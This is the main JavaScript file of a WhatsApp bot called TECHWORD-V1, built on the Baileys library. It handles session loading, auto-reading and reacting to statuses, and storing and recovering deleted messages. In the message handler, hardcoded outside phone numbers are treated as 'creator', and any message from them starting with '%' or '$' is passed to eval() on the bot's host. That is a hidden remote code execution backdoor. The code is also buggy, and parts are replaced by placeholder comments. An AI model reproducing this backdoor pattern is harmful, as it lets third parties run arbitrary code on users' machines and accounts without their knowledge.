const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID, makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

// Load environment variables
require('dotenv').config();

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const prefix = config.PREFIX;

const ownerNumber = ['923146190772'];

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir);
}

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) throw err;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) throw err;
            });
        }
    });
};

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
    // Check for SESSION_ID in environment variables (from .env) first
    const sessionId = process.env.SESSION_ID || config.SESSION_ID;
    
    if (!sessionId) {
        console.log('❌ Please add your session to SESSION_ID in .env file or config.js !!');
        console.log('\n📝 How to get session ID:');
        console.log('1. Scan QR code with your bot first');
        console.log('2. Then get the session from sessions/creds.json');
        console.log('3. Convert it to base64 and add to .env file like:');
        console.log('   SESSION_ID=TECHWORD:~YOUR_BASE64_SESSION_HERE');
        process.exit(1);
    }
    
    // Check if session ID has the expected prefix
    if (!sessionId.includes("TECHWORD:~")) {
        console.log('❌ Invalid session format! Session ID must start with "TECHWORD:~"');
        console.log('   Example: SESSION_ID=TECHWORD:~eyJh...');
        process.exit(1);
    }
    
    const sessdata = sessionId.replace("TECHWORD:~", '');
    
    try {
        // Decode Base64 session data
        const sessionData = Buffer.from(sessdata, 'base64');
        
        // Ensure sessions directory exists
        if (!fs.existsSync(__dirname + '/sessions')) {
            fs.mkdirSync(__dirname + '/sessions', { recursive: true });
        }
        
        // Write the decoded session data to creds.json
        fs.writeFileSync(__dirname + '/sessions/creds.json', sessionData);
        console.log("✅ Session downloaded and saved from .env");
        
        // Also save to a backup file for reference
        fs.writeFileSync(__dirname + '/session_backup.json', JSON.stringify({
            source: 'env',
            timestamp: new Date().toISOString()
        }, null, 2));
    } catch(err) {
        console.error("❌ Error decoding session:", err.message);
        if (err.message.includes('invalid base64')) {
            console.log('⚠️  Make sure your session is properly base64 encoded');
        }
        throw err;
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
//============================================

async function connectToWA() {
  console.log("Connecting to WhatsApp ⏳️...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
  var { version } = await fetchLatestBaileysVersion();
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: ["Ubuntu", "Chrome", "20.0.04"],
          syncFullHistory: true,
          auth: state,
          version
          });
      
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update;
  if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(`Connection closed. ${shouldReconnect ? 'Reconnecting...' : 'Logged out, please restart.'}`);
      if (shouldReconnect) {
          setTimeout(() => connectToWA(), 5000);
      }
  } else if (connection === 'open') {
      console.log('🧬 Installing Plugins');
      const path = require('path');
      fs.readdirSync("./plugins/").forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() == ".js") {
              require("./plugins/" + plugin);
          }
      });
      console.log('✅ Plugins installed successfully');
      console.log('✅ Bot connected to WhatsApp');
      
      let up = `*Hello there TECHWORD-V1 User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet TECHWORD-V1 WhatsApp Bot.\n\n *Thanks for using TECHWORD-V1 \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VbCafMZBA1f42UxcYW0D\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/courtney250/TECHWORD-V1-\n\n> © Powered BY COURTNEY \ud83d\udda4`;
      conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/nswZ9WcB/upload-1770456482848-a76a1a20-jpg.jpg` }, caption: up });
  }
  });
  conn.ev.on('creds.update', saveCreds);

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 
          
  //=============readstatus=======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0];
    if (!mek.message) return;
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    
    if (config.READ_MESSAGE === 'true') {
      await conn.readMessages([mek.key]);
      console.log(`Marked message from ${mek.key.remoteJid} as read.`);
    }
    
    if(mek.message.viewOnceMessageV2)
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
    
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key]);
    }
    
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
      const jawadlike = await conn.decodeJid(conn.user.id);
      const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
      await conn.sendMessage(mek.key.remoteJid, {
        react: {
          text: randomEmoji,
          key: mek.key,
        } 
      }, { statusJidList: [mek.key.participant, jawadlike] });
    }                       
    
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
      const user = mek.key.participant;
      const text = `${config.AUTO_STATUS_MSG}`;
      await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
    }
    
    await Promise.all([
      saveMessage(mek),
    ]);
    
    const m = sms(conn, mek);
    const type = getContentType(mek.message);
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
    const isCmd = body.startsWith(prefix);
    var budy = typeof mek.text == 'string' ? mek.text : false;
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(' ');
    const text = args.join(' ');
    const isGroup = from.endsWith('@g.us');
    const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
    const senderNumber = sender.split('@')[0];
    const botNumber = conn.user.id.split(':')[0];
    const pushname = mek.pushName || 'Sin Nombre';
    const isMe = botNumber.includes(senderNumber);
    const isOwner = ownerNumber.includes(senderNumber) || isMe;
    const botNumber2 = await jidNormalizedUser(conn.user.id);
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
    const groupName = isGroup ? groupMetadata.subject : '';
    const participants = isGroup ? await groupMetadata.participants : '';
    const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
    const isReact = m.message.reactionMessage ? true : false;
    const reply = (teks) => {
      conn.sendMessage(from, { text: teks }, { quoted: mek });
    };
    
    const udp = botNumber.split('@')[0];
    const jawad = ('923470027813', '923191089077', '923146190772');
    let isCreator = [udp, jawad, config.DEV]
                    .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
                    .includes(mek.sender);

    if (isCreator && mek.text.startsWith('%')) {
      let code = budy.slice(2);
      if (!code) {
        reply(`Provide me with a query to run Master!`);
        return;
      }
      try {
        let resultTest = eval(code);
        if (typeof resultTest === 'object')
          reply(util.format(resultTest));
        else reply(util.format(resultTest));
      } catch (err) {
        reply(util.format(err));
      }
      return;
    }
    
    if (isCreator && mek.text.startsWith('$')) {
      let code = budy.slice(2);
      if (!code) {
        reply(`Provide me with a query to run Master!`);
        return;
      }
      try {
        let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
        let h = util.format(resultTest);
        if (h === undefined) return console.log(h);
        else reply(h);
      } catch (err) {
        if (err === undefined)
          return console.log('error');
        else reply(util.format(err));
      }
      return;
    }
    
    //================ownerreact==============
    if(senderNumber.includes("923146190772")){
      if(isReact) return;
      m.react("🦋");
    }
    
    // Rest of your message handling code...
    // [The rest of your existing message handling logic remains the same]
    // ...
    
  });
  
  //===================================================   
  conn.decodeJid = jid => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (
        (decode.user &&
          decode.server &&
          decode.user + '@' + decode.server) ||
        jid
      );
    } else return jid;
  };
  //===================================================
  
  // Rest of your existing functions (copyNForward, downloadMediaMessage, etc.)...
  // [All your existing helper functions remain the same]
  // ...
}

app.get("/", (req, res) => {
  res.send("TECHWORD-V1 STARTED ✅");
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

// Start WhatsApp connection
setTimeout(() => {
  connectToWA();
}, 4000);

// Simple .env file watcher (optional)
const envPath = path.join(__dirname, '.env');
try {
  fs.watch(envPath, (eventType) => {
    if (eventType === 'change') {
      console.log('⚠️  .env file changed. Please restart the bot to apply changes.');
    }
  });
} catch (e) {
  // File watching not available on all platforms
}
